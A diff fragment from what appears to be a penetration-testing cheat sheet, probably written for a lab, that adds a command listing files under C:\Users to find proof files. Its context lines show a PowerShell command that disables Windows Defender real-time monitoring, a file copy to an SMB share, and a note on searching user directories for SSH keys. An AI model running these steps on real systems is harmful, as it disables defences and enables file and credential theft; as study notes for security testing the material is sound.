@@ -79,6 +79,9 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 - Copy files: `copy <FILENAME> \\192.168.45.223\share`
 
+### Locate local/proof files
+- `tree /f /a C:\Users`
+
 # Enumeration
 
 Search for SSH keys in Users directory:
